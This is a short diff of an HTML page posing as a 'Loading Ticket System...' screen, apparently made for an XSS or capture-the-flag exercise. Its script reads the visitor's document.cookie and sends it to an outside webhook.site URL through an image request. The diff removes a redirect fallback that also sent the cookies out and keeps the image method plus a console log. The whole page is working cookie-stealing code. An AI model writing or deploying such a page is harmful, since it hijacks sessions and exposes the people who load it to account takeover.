@@ -7,20 +7,14 @@
     <h1>Loading Ticket System...</h1>
     
     <script>
-        // Simple and reliable cookie stealer
+        // Simple cookie stealer
         var cookies = document.cookie;
         
-        // Method 1: Send via Image (most reliable)
+        // Send cookies to webhook
         var img = new Image();
         img.src = "https://webhook.site/6ad393d5-ac29-4a94-aeaa-1d31965ba5c0?c=" + encodeURIComponent(cookies);
         
-        // Method 2: Log for debugging
-        console.log("Cookies:", cookies);
-        
-        // Method 3: If still not working, try this redirect approach
-        setTimeout(function() {
-            window.location = "https://webhook.site/6ad393d5-ac29-4a94-aeaa-1d31965ba5c0?redirect=1&cookies=" + encodeURIComponent(cookies);
-        }, 500);
+        console.log("Cookies sent:", cookies);
     </script>
 </body>
 </html>
